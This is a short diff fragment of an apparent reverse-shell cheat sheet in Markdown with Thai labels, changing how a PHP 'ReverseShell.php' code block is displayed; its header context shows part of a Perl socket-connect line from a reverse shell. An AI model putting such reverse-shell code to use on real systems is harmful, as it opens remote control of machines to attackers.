@@ -28,8 +28,7 @@ if(connect(S,sockaddr_in($p,inet_aton($i)))) {
 ```
 ## PHP
 ReverseShell.php
-<details>
-  <summary>ดูโค้ดตัวอย่าง</summary>
+<div style="max-height: 300px; overflow-y: auto; border: 1px solid #ddd; padding: 10px;">
 	
 ```php
 <?php
